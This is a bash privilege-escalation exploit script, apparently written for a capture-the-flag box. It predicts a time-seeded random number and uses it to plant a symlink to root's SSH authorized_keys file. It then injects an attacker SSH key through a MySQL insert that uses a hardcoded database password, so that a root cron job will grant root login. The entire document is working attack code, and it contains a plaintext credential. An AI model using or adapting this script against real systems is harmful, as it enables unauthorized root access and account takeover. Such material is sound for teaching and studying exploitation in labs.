#/bin/bash

cat > /var/tmp/d.c <<'EOF'
#include <stdio.h>
#include <time.h>
#include <stdlib.h>


int main() {

    time_t now = time(NULL);
    time_t next = now - (now % 60) + 61;
    srand(next);
    printf("%d\n", rand());

    return 0;
}
EOF

echo '[*] Writing c code to get "random" int'
gcc -o /var/tmp/d /var/tmp/d.c
randint=$(/var/tmp/d)
echo "[+] Got random int: $randint"
echo "[*] Cleaning up code"
rm /var/tmp/d /var/tmp/d.c

id=223
fn=$(echo -n "${randint}${id}" | md5sum | cut -d' ' -f1)
echo "[+] Filename will be: /var/local/$fn"
ln -s /root/.ssh/authorized_keys /var/local/$fn
echo "[+] Created symlink to /root/.ssh/authorized_keys"

ssh="ssh-ed25519"
key="AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d"
user="nobody@nothing"
echo "[*] Writing to DB: insert into messages(id, name, email, message) values ($id, '$ssh', '$user', '$key')"
mysql -u crossfit -poeLoo~y2baeni crossfit -e "insert into messages(id, name, email, message) values ($id, '$ssh', '$user', '$key')"

secleft=$((60 - $(date +%-S)))
echo "[*] Sleeping $secleft seconds until cron"
nextmin=$((1 + $(date +%-M)))
while [[ $(date +%-M) -ne $nextmin ]]; do
    echo -en "\r[*] $((60 - $(date +%-S))) seconds left"
    sleep 0.5
done
echo -e "\r[*] Try logging in as root with SSH key"
